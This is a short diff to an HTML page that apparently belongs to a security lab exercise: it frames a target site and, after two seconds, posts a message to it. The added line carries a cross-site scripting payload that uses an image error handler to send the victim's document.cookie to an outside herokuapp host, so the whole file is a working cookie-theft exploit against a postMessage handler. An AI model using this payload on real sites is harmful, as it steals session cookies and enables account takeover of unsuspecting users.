@@ -4,12 +4,10 @@
     <title>Test</title>
 </head>
 <body>
-    <iframe id="frame" onload="hack()" src="http://ptl-fdd2d5de-c241c114.libcurl.so/"></iframe>
+    <iframe id="frame" src="http://ptl-fdd2d5de-c241c114.libcurl.so/"></iframe>
     <script>
-        function hack(){
-            setTimeout(function() { document.getElementById("frame").contentWindow.postMessage('frame'.value,'*');
+           setTimeout(function() { document.getElementById("frame").contentWindow.postMessage("<img src=a onerror='document.write(\"<img src=http://lab--work.herokuapp.com/?c=\"+document.cookie+\"/>\")'/>" ,'*');
                                   },2000);
-        }
     </script>
 </body>
 </html>
